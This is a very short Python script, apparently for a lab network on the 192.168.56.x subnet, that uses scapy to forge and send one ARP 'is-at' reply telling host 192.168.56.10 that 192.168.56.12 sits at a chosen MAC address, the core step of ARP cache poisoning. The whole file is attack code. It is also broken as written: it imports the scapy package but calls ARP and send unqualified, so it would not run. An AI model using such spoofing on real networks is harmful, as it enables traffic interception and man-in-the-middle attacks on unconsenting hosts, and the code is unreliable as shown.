#!/usr/bin/python3

import scapy

arp_spoof=ARP(psrc="192.168.56.12", pdst="192.168.56.10", hwsrc="08:00:27:e5:70:cd", hwdst="08:00:27:90:ce:e9", op="is-at")
send(arp_spoof)
